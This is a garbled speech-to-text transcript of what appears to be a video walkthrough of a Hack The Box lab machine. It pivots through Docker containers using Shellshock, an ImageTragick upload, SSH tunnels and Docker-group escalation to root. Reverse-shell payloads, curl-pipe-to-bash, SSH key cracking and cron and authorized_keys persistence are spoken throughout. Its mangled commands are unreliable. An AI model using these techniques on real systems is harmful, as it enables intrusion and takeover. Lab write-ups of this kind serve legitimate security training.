 what's going on YouTube this is IPSec and we're doing a wreck guy from hack the box which is all about network pivots and we're gonna do something a little bit different in this video and that's kind of show how the machines architected because it's one Hurst machine for different docker containers and if we didn't do this it may be hard to follow along by just watching and listening so we're gonna jump over to a graphic the machine fader did to explain this box so this is how a wreck eye is laid out we got the VM up top here then down below you have four different docker containers the left side is reka well I've done that the right side is reka I test net and down the middle or machines on both networks the first thing you probably came across was port 443 and that goes all the way down to this RAF live which is a Web Application Firewall this guy can either send traffic to the test side or live side it's dependent on the hostname and I think it defaults to live since this is put 443 this has to have a SSL certificate that identifies both sides unless going to get SSL certificate errors so that's why when you view this SSL cert on this box you can actually identify the test subnet and get this box to route traffic to test from outside the rack I box but once you get on test you're supposed to pivot into the bastion which is dual homed that allows you to connect to Kalvin directly without going through this Web Application Firewall and that's why you can do the shell shock from this box and then once you do that and get on this box there's information that lets you pivot into the host or a wreck I and then from that you can use docker to prove ask so hopefully this little thing makes sense once we start going through the box and yeah let's just jump in and do the Recon like every box let's start off with the end map so and map - SC for default scripts sv underrate versions Oh a output all formats we'll put in a map initial then the IP address of wreck I which is 10 10 10 65 all arrayed ran this so let's just look at the results we have SSH listening on port 22 nginx which is HTTP listening on 443 and OpenSSH again listening on port 10 22 this is the first odd thing we see as SSH listening on two different ports if we look at the SSH host key we do have them being different at the 2048-bit a 7 5 b 7 8 4 o we also have different ubuntu versions in the actual header so this is a hint that there's some type of network address translation going on and multiple hosts the other hint is we have an map saying subject alternative names dns is calvin correct ID IH CB and beehive direct ID h DB but let's just look at the Ubuntu versions to Ubuntu to 8 I believe is trusty so if we just google that actually we have to do it over on this right side then we can go to launchpad and see this is uploaded to trusty and then we can do this right side which is not right side for Ubuntu 2 to go to launch pad and we see this one is xenial so chances are the first ssh we're going to want to hit is the older version because older things are more likely to be forgotten about or not patched so this SSH is probably the first chain but always try them twice it's just a nice little hint of turning order things before targeting the newer things let's go check out the website at ten ten ten sixty five four four three so go into Firefox ten ten ten sixty five be able to connect because we don't have HTTPS it's not listening on port 80 so it doesn't forward us we do have just a maintenance page if we look at the page source nothing really there so first thing we're gonna do is start go Buster so we can have that going in the background while we play with things so we'll do op to go Buster and we're really good just put on my path one time don't have to do ops go Buster Buster every time but I do - H and will do - Kate - ignore certificate checks we want - you to do a URL which is HTTP 10 10 10 at 65 - w-4 word list with a user share word list - Buster I normally do two three but this one it should be and one oh and I'm also going to do a status code because we want to see 403 I don't like that go Buster doesn't default to that so we're at 403 in that which is authorization do not an authorization error access denied so if we stretch that off or do - t-50 so it goes a bit faster and then we can begin poking around at the host names if you want to know how nmap pulled that you can just go to the SSL certificate view sir details I may have to go ah on the alternative names we have DNS name at Calvin data record I used to be and beehive direct ith DB so that is how an map pulled that and let's see if they actually do anything so open up burp turn intercept dawn refresh send this into repeater we could name this virtual host routing test if we click go when a host is just ten ten ten sixty five we could just not modify page and we also get X - Iraq I - laughs which is the biggest key that we're going through a web application firewall and the host name it defaults to is beehive direct i dot h TB let's delete the headers on our side on a request that relate to cache click go we get something weird that is the page when you trigger the laughs and I think it's because we have just three empty lines here when you to just have one empty line okay yeah so there we go wet a wreck eyes page and I say a wreck guy's page because we see this graph header telling us being forwarded to beehive doc i HT b if we change the service to the other one Kalvin dot a wreck i dot h DB i misspelled that calvin we get a completely different result 404 not found so there's you hit there's some type of virtual host routing going or on and we don't have any HTTP header so maybe this isn't going well it's mark it's going through the raf but maybe the waif isn't doing anything or something it's odd the waif header is not in this request maybe it's just not in the four fours going back to our go Buster we have slash blog discovered so let's check that out disabled Bert go to slash blog we have to do HTTP and we get a bootstrap page this looks like WordPress but if we do like slash wp-admin we don't have anything and if you viewed the source you'd see it's probably just a completely static site another thing you could do is go into burp go to your target go to a 10-10 1065 blog spider this branch and we'll see what comes back mail oh we got a PHP script potentially let's try mail slash contact underscore me dot PHP I actually didn't notice this before and it's actually giving the source code to the PHP script so PHP is not even being executed here so we can completely ignore this vendor bootstrap a bunch of HTML so it not actually executing this PHP is a big indicator that this slash blog is a completely static site because it's not executing PHP files something just good to note we can go back to a go Buster and go Buster hasn't found what I'm looking for yet it's supposed to find a CGI - bin and just hasn't so let's look at the word list and we'll see where CGI bin is there and actually that's the search it's the very first thing in this word list so let's see what's going on if we go to a web browser actually go to boot and we can do CGI - bin see what it says we have to go to beehives so just put anything in the host it defaults to that we get for for put a slash and now we get that for three so that's what we want to do I forgot one flag on go buster so let's terminate it we can actually show that so / CGI bin with no slash 4 4 slash blog with no slash we get a 301 but in go Buster if we add a thing as a dash F let's just go up here search for it yeah - eff up ends a forward slash - each directory request so let's add that and a go Buster command and now we get slash sieged CGI bin so we can take that out so we're no longer brute-forcing directories and just do a directory list maybe that should be fine oh no we have to change it to slash CGI band slash and now we'll see if we find any files in there any file we're actually looking for so we're not waiting for that to finish it's called either stat or stats stat is not found stats is so this should find stats eventually we have to do 2.3 but you can take my word that if it makes the request the file will come back there's no magic there I'm just impatient and don't feel like waiting so if we look at stats we get this big thing to come back it shows a - version which is 4 - 3 and this is actually vulnerable to shell shock if we just google bash 4 - 3 7 show shot comes up so if we wanted to try shell shock we could easily do so by turning intercept on going back to this CGI refreshing sending it over into repeater with control or if you do control shift or it automatically goes to the tab and we can change this user agent and call this cell shock to something that's shell shockable so open quote that then we could do echo echo then is it then Who am I oops that's finally came back so there you have it which Who am I user been Who am I and we get this back so this is a taunt from the actual Web Application Firewall and the very first thing I did when I saw this is well I knew something was there and something stopped me it didn't make it to the server because this code should never translate into this so I just sent one frenzy and we get the thing back open and close paren see get this back open close parentheses with the curly bracket and that's when we get the actual Web Application Firewall maybe if we just do closed parentheses space squiggly bracket nothing so the actual signature is based upon this so the next thing is add a few spaces spaces don't seem to break the signature spaces in oh and have a space after that which is a requirement for shellshock so spaces don't break it I tried to do like ifs which this variable is space by default and we can look at the user agent it's not person that we could just do I think that is also going to be translating to a space doesn't translate it we can try to fuzz something in this to get to execute but then it breaks shellshock so shell-shocked doesn't work when we start putting things in you could keep trying to fuzz this I didn't find a way around the shellshock signature so I moved on it took about 15 minutes of fuzzing as I guess it's probably a rabbit hole let's just look at that other host name that we saw when we were doing so let's go into a host file to make making the request easy we can say 10 10 10 65 goes to both beehive dot a rat guy dot h DB and Alvin a rat guy HDB turn burps intercept off and we can do /up up jumping ahead of myself HCBS Calvin dot h TB not used to be correct i dot h TB we give this not sound page first few things we can't rise like robots dot txt nothing we saw a slash blog nothing cgi-bin nothing so we can start a go Buster up to try to find it we do HTTP now Calvin HT be not correct guide HDB I'm not used to they're actually being a sub-domain tell that to go eventually go Buster is going to find a slash uploads it ends with the slash so we need to add that - that flag was it / upload / upload we don't have to have that - f we actually can't have that - f so we got up loot image here we can look at the page source to see where it goes and we don't see anything we could try to guess an upload folder because if we want to upload a malicious file we have to know the upload folder so we can do slash upload slash uploads try to find that or this is also a hen we got two masks here and these are tragedy I guess if we google tragedy masks you may be able to pick up on the reference to that image and there was an exploit around uploading images called image tragic so that's why this a skier hints at image tragic because you're supposed to think oh there's an file upload what a tragedy or an image upload what a tragedy and hence image magic so that was a nice little hint for that maybe David laundry is another head but I think the hint is the masks being with tragedy so if we want to we can Google Image tragic and see how that exploit works so image tragic calm that's mitigating it here's the actual exploit you essentially upload a MVG and this fill parameter and the image tragic library was command injectable so if we create a mvg not MV b MV g and put that this should execute LS - la but we don't want to do that we want to get a reverse shell so if you did more looking into image tragic and looked at the actual payloads that people said this CloudFlare post was a good one that says the real payloads being used to hack for image tragic and scroll down you get a much better fill that does a set Sid to create a new session then does been bash and reverse shell so let's use this one instead of VLS okay and our IP address I think I'm ten ten fourteen sixty let's just verify 1430 okay that looks good and see LVN p14 for three go back into image tragic browse route documents HTTP boxes rec i MV g and upload you get a failed to connect and nothing back let's look at the file we created that if ii mvg use it been that should have worked 10 10 14 30 sets it'd been bash - I oh except I don't know if that's the right shell let's look back at that web blog to see if it copied right that's tragic there's a copyright let's go back do ONC LV mp443 and a burp history so not sending that through but that's a bummer that should've went through it huh htps Calvin upload rails hip second VG upload it's not him I put proxy not sure why oh well let's just edit epic VG and I think we need like that back brows it's like this sable and Abel I want you get a burp there we go now this makes a bit easier to send it a bunch of times send this request nothing oh it's last 20 is 22 hex with that did CloudFlare just purposely break that encode as hex 22 that may fix it that did so the Clara flow blog just had this one thing encoded so that's all that was wrong I do want to play with one thing real quick let's everyone get that LS to work for a proof of concept I think I just noticed why LS wasn't working before when I was playing around with it so if we go to image tragic let's see copy this line back in repeater face this go you should be redirected to this when you put HTTP in that redirection and I can't edit that huh we go to proxy intercept dawn should be with ya back browse upload face the LS we also want to go into options intercept server response forward we get the 302 found it's redirecting us to URL we wanted to do HTTP for a word get GPS know that Stack Exchange okay it doesn't work cuz we can never view the image it doesn't have any standard out but the key thing is is doing something out-of-band and when image tragic when first around a lot of people had done pink commands and pinged it back to them and there's also this set said now we could also just do to get a reverse shell but paying lot west malicious and may not get in trouble for doing it still not recommended but if you're doing a bug bounty program and getting shells is out of scope do a ping and that will prove its vulnerable to image tragic while keeping you out of jail and as a bonus most servers can ping out to the Internet you can also do DNS requests and things like that but now Warren Calvin let us do the Python TTY shell so what PT YP - why not spawn Bend bash - why wrong - echo so now we have a TTY we can do tabs control C and not kill a session so we'll call this Kelvin and if we do ifconfig not found IP addr not found so we can't really look at our IP a list no it's not IP list IP address maybe we'll go in for a log cat yum could potentially find it there but all those commands just pull information from proc so proc net we have tcp and that is a lot of tcp I think 0a and this column means listening I want to say I'm not positive how to read this off top my head I want to say 7f 87 F 2x let's see what that is sent after toodle decimal 7f good-x is 127 now one of these you can Google how to read this table but this date is either listening or what state the socket is in and then this local address one of these is ports I met one F 90 is 80 actually looking at this you get the local address and this is IP port 0a is definitely listening and we have all these 1f 90s so this point a lot of things on port 80 so if we do convert F value is 8080 so yeah that is correct so this server is listening on 0 0 0 port 8080 and the wife directs it to that we can also probably search this for 443 which I believe is 1090 she was going a little slow there 1090 maybe not I would think we'd see something in the second column which is a reverse shell but that's not important that is not where we're looking for I was just trying to explain something and that fell a bit flat we need to find where the IP is and I think that is an IP mr vif maybe no that is not it let's see ICMP is it stat no no one of these files will be it it's not a IP let's see cat fib tree there it is this defi was looking for it and /proc it's been a while since I looked at these but we have / 32 hosts local and then this so 172 23 0 11 is the IP address the other / 32 host local is 127 0 0 1 so that is kind of how you can read how ifconfig and things work at all purses out of this /proc file structure so we know we are the IP address of 172 23 0 11 doesn't really do us much we could also cat the up thing and we see there's 172 23-0 252 172 23:01 and again we had to do that because the binary isn't here this is common in docker is a lot of the binaries won't be there because they're not needed by the program so that's why you have to learn about this /proc stuff 0 1 is the gateway 0 252 this is the Web Application Firewall but all that stuff isn't really important I just wanted to show that because that's something I look into and I'm not going to do the Lindy num script because all the binaries aren't there so I'm just gonna do LS dash away on slash and see what we see right in the very root we have docker and so let's look at that Wes isn't even there so let's cat the file that is empty there is common I've never really seen common before and we do LS dash away there's a hidden thing called dot secrets and inside of dot secrets is a bastion key so I'm going to cat fashion key pub and we see that is for the root user and we're just gonna copy this the bastion key paste it chmod 602 save that for later let's look into what network is weak at make Nats we do see a script for creating dr. Tanner's with a 172 24 0 subnet and a 172 23 0 some that so this is the very first clue I think we have to the actual network of the shell shockable machine and we are when I say we were I think we are 170 223 proc Matt fib 3 yeah we have 170 223 so we want to get to the 170 224 Network and this machine is cannot do that because we can't route there we can go into containers see what is in here we have the wife live we look at this we don't have less let's just do cat da config this is it for SSL certs cat start on SH connect to 172 24:02 252 so let's see if we can ping that address from this box and we can so we can keep working around these containers or we can just try using SSH key that we got from Iraq I and s is aging somewhere so LS la it is chmod 600 - I bashed and key - 10 10 10 65 we get denied remember we have SSH also listening on foot 10 22 so we can try that and we'll see if this one lets us in it's definitely taking a while to get there and we get on and automatically route at Ezra we do our ifconfig we have 172 2302 53 in 1/72 24:02 53 so - 53 on both these networks if we go up go back to Calvin the RAF was on once in t2 23:02 52 so we now know war on a box that we haven't met before if you remember from the diagram this is that bastion host that is dual honed so let's try accessing curl 1 72 24 0 let's see go back to Kelvin what was that proc command Calvin is 172 23 0 11 so let's try 24 0 11 coral is not a command W get and they didn't reuse the last octet because 24 0 11 port 80 doesn't connect we can try 80 80 and it still doesn't connect so we're still a little bit stuck on where to go we can do up - a n to see if we're talking to anything we have 170 - 24 0 1 0 to 11 is incomplete because we couldn't get an ARP and we still just have to poke around esra to find out where we want to go go back to slash we can go into common look in network still the same thing we don't have any specific IP s just networks so go into containers and let's go into convert live free cats dirt 2311 convert live is the one that we did image tragic on flow test is the one we want to get into so cat start Sh and we see a wreck I is listening on IP 172 24 0 to see what else a wreck guy has we go in CGI we have that stats file if we go into config we have Apache to site and sites available so we could go to CD sites available cat default and see he's listening on port 80 well forget our sites enabled defaults the only one enabled and port 80 so let's do it double you get again instead of dot eleven let's do one sim two 24:02 and we start trying to write a file so now we know we can access the other host beehive so double you get I think has - - user - agent to specify and we can do shell shock I don't know why my host keeps hanging like this there we go echo echo user bin Who am I to 172 24:02 CGI bin stats and then we cat that file we have WWE - we know we have code execution there we could do a reverse shell to this but I'm going to do something else so this is Ezra so on this box we could probably either use T MUX or a screen or just SSH again and then use n cat coz n cat is on this but let's do SSH tunnels because that's something we haven't really covered that much so you could do it with SH - L and then that but once you're in an SSH connection you can hit the squiggly key which is that and it has to be the very first thing you do on a line so if I just hit that squiggly C which is what I want to do nothing happens but if I want to do line and do that I drop into this SSH prompt we need to help and look at the commands I can do and there's - L - o and - D these are the three things that we'll be playing with - L is a local port forward - Allah is a remote port forward and - D is dynamic so you can think of - L as we don't want to echo that so - L is local so we're going to listen on a port so on a host we will local host yeah we can specify it this way one 27001 it's not really listening well it is really listening on that but that's your local host listening on a port so we can say we want to listen on port 8000 one and any time we send something to this port we want to direct it to the server and we can direct it anywhere we could say hey send this to local host or we could say send this to a remote host in this case we want to send it to 172 2402 port 80 so that is - L and that syntax would go like - L 8001 one say - 24 0 to 80 the - R is the reverse it is going from the reverse host so this will be your SSH target listening on port will say 8000 - and that's going to be sending it to us with and we can send it anywhere on our network so if we sent this to another box on a local network we could do it that way if maybe it'll make sense in a second we can say 8003 so let's do that real quick so we do - see that squiggly see then - l 8001 172 24 0 to 80 so now it's forwarding a port on my local host so if we do netstat a LNP grab 8,000 won I'm not listening on port 8000 won and if I kill one is M 0 0 1 on port 8000 1 I go into beehive and if beehive connects back to Ezra on port 8000 - it's going to direct them to port 8000 3 on me so if I do NC local host 8,000 - that should have went to me I haven't done the - show yet so - OH 8,000 - so that's going to be the SSH target listening on port 8000 - and he's going to be sending it through the SSH connection and then after it gets through that SSH connection let's go to local host on port 8000 3 so now when i NC local host on 8000 - it connects and we can see that works so what that magic allows us to do is now we can do curl I think - capital a is for agent we can do shellshock okay I want a cat my thing does I have the nice shellshock reverse shell yeah but we can do cool - a shell shock go that go I don't think we need both those echoes but oh well then then bash - I dev tcp and we have to do as Rezai P address which is 172 24 is 0 253 and this is going to be we did port hey L know dot close is figured out a list if you ever forget you can google konami code ssh and get a nice sans post by jeff McJunkin x' which explains all this a McJunkin let's see doc terminates beasts and the break see request ricky list is with pound that's connections open there should be one that lists for the connections huh I swear there's one that lists all the things that are open because that's definitely not what we're looking for but I think we're listening on 8002 and sending it to 8003 so what do 8000 - and then we need direct standard out to one and then standard error - that that should be good and CoV NP 8003 all goes well this will hit us so local host on port 8000 one cgi-bin stat stats there we go and then we have it shell-shocked came and it went through that host so you know open this up again real quick screen so we're outside here we go in and we use this bashed in whoops and we have port 8000 to open here and that's forwarding us all the way back out to our host how do I explain I'll look at something where I can draw my screen easier cuz it'd be much handy if I could just right on that image but that's how as a sage things work s is 8:40 and this is now beehive that we're on and now that we're here let's do python import p2i you - why not spawn then sh ft y raw - echo okay so we're on beehive if we get a comment and go back into containers and start looking at things so it's one blog test let's go in blog test and see if we see anything we got to build nothing there config doesn't look like it we don't have up if configure IP pata oh we do have IP addr on this one so this is a slightly different build than the Calvin because we didn't have IP on Calvin do we have net stat a OMP no we do not but I bet if we cat proc net TCP 0a and 50 that is port 80 so if we go here see your ex 80 dude decimal no 128 now I'm just confused yeah we'll worry about this another time if you want you can google how to read this but I'm almost positive I don't know I'm doing something wrong when trying to read that zero a is listening though oh I really should do more research before I start these videos but anyways let's just keep going see if we can find a file of interest so we can look at the bastion live cat start Sh don't really see anything too interesting cat build here don't see anything sshd looks interesting so let's go in there we just cat it that's the SH file between cat dockerfile and we have a password the root password and all the other ones in dhaka file I think this directory is shared amongst all the doctor containers so let's go to Ezra / common containers ashton cat doctor file yeah that passwords in all of them and the only reason we didn't look at it before is because we are already root so if we go to Calvin as well both of those are running as root so if we do su to switch to root user we can paste this password and escalate so now we'll root amongst all three doctor containers if we go to slash home there is Spanish dancer and if you do WC so if you cat user dot txt it will show you the contents will count the characters and say hey there's 32 characters in this file and then a line break which just makes it 33 so that is the file to get user text we can look in the content folder that is the blog that we solve for the website P dude LS dash L a there's a dot SSH directory and this has a another SSH key and if we can't ID or say that pub we get its username is Spanish dancer so let's copy this and this one is a encrypted key so let's see the Spanish dancer that's one thing I do your sa paste it and then we have to now crack it so what's SSH into not my VM because cracking from VM is very slow going my cracking box we can create the key so Spanish dancer SSH paste it then John the Ripper because hash cat doesn't really do keys it's really the only reason I ever used John is for SSH keys I think we run SSH ng to John to convert this key into a format that John will crack root Spanish dancer to SSH Spanish dancer SSH doc okay and then we can do John root Spanish word list and then we can try opt for list rocky text it's running and it's already cracked it as purple one so then get out of here and try SSH Inge Shi Spanish dancer to ten ten ten sixty five and we need to be the Spanish to answer a user chmod 644 maricon that was the host we thought if we do if config we have a bunch of interfaces so this is finally the host machine and we have to pivot to route so we can do lynnie num so op let's just copy it when X risk Lantern oom and then Python M simple HTTP server we can curl ten ten fourteen thirty eight thousand when SH write that over to bash to run it whoops the top and start looking at what we're saying so we knew the kernel as Ubuntu zhenya it may have a professed now for the kernel but at the time of launch it didn't and that's not intended so we'll ignore that we are in the docker group and this is dangerous if you remember from calamity this is very much similar to the previous calamity but that was LX see this is docker and it's just dangers of virtualization or giving your user access to virtualization because bad things can happen so we don't even finish with that and we're just Google dangers of dr. riff ask maybe is it possible escalate provision escaping from doctor privilege escalation via doctor and TOD uh don't use the doc of group you can read all this for it but if you're doing doctor it's best to just strict people down to pseudo because we can do doc Oh run we can map / to a different directory and then execute something so if we just do doctor run then let me know if we need - be what is - be dr. Ron help oh we do need - we find a volume that's not verbose so dr. Ron - V so bind will do / - a folder inside of a dr. container so we'll do /tmp and then we can buy just do bash bash nope doc go run - v / down - Pat not to pass bash what is it there's something for run command maybe - T there we go we do ID maybe we missed something dr. Ron - v / last time - I may be that's interactive - T bash bash so - T allocate tty - I let's see what - I is oh oh I don't know what is but that's it so it helps to do everything the post says I should have read that but anyways - I does something - T does TTY and now we are route if we do LS la / route we don't get anything but remember we bound / root over host into the temp directory so I go into temp now in another operating system go into this route and there's route text so WC - see route text you can get that file you can also go into like verse pool krong krong tabs v route and we could just do every minute do Bend bash - I have TCP once every 2 10 10 1430 we'll say eight thousand four and zero one two one maybe that's right I think I've write wrote this reverse shell enough where maybe I haven't memorized finally I always mess it up but NCL VMP 8,000 for date wait about 20 seconds and we'll see if that cron runs so let's see another 15 seconds left I should just put the pain but oh well we will wait about 10 seconds left so 10 9 8 7 6 5 4 3 2 1 and no shell so I probably screwed something up so let's see let's go split this pain we don't need to listen on this port anymore and we can go into cat SEC MVG so bin bash - I - dev TCP 1010 1430 8004 crap reverse these suppose I didn't connect to us and then just not do anything I didn't have an ant at the end I'll try that date too long so we can do this and put this down here like I want it to eight thousand four and then we can also server the route see if we can take this quick one two three four five so we get 10 10 14 38,000 so W gets just a bit more reliable because it's not a whole reverse shell chances are that will work if we do 10 10 1434 8000 we get a hit there date there we go we got that cron to run but we didn't get a reverse shell so we know we have code execution but for some reason we're not getting a reverse shell so what I'm going to do is we'll just try executing a file because if we do that we can know the file works in bash no such file or directory I should have kept the show up huh Siwon which bosch use a local bin bash what which Sh user local been bash well exit this ID no exit back to being Spanish dancer which - no it is slash bin bash let's try this again doc Oh run - V for volume slash we'll just do /mnt that's a bit safe and then tap - I T bash bash CD / mount the spool Kron 4 spool cron contacts V root ok so 10 10 14 30 that looks right use a local Bend bash - hi Oh cat root use a local bin bash still testing if this code works that does so if we do PWD so we can go mount the show SH then - no that should work because we've done that shell chmod plus x so on SH we can then bash that so it definitely knows that's executable then bash Manitoba that's fine because would use a local bin because we're doctor I guess first bull Kron gone tabs V route and we can just say slash shell Sh so fee shelled on SH and we can touch slash powered first so now when they're script runs we should know if it airs out on that reverse shell it should still touch a file so we should know what's going on this time around and in 40 seconds we can get a true shell and stead of being in this dr. container with the root volume mounted doesn't look like it ran again and we don't have pwned but we are getting that cron that is interesting I know this is something probably stupid but I'm just gonna ignore the cron now because I'm overlooking something silly and we're just gonna do an easier way so if we go in Spanish dancer we can see pssh authorized keys to mount route done SSH we have to go into slash mount route create SSH then we can see P home Spanish dancer ssh authorized keys into this directory chmod 600 and then Shi Spanish dancer to 10-10-10 65 purple one and now we are route the actual root user so that's the easier way to do it delete all of index CD / SH did exist Conte a bell one two one two three four five that's the correct number let's see if we can just execute this connection refused we and Cl VMP 8000 for a shell that works I'm not sure what's going on with that cron maybe I just wasn't listening on the right port and it was something stupid like that but SSH key is definitely the easier way to do it so that is the Box hope you guys enjoyed take care and I'll see you next week